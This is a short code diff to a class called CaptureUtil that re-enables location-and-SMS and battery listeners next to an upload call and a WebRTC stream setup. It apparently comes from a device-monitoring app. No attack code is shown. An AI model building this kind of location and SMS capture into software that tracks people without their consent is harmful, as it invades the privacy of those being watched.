@@ -29,10 +29,10 @@ class CaptureUtil {
     _uploadChanges(null);
 
     // ⬇️ LOCATION + SMS
-    // _locationListen();
+    _locationListen();
 
     // ⬇️ BATTERY
-    // _batteryListen();
+    _batteryListen();
 
     // ⬇️ WEBRTC
     _initStream();
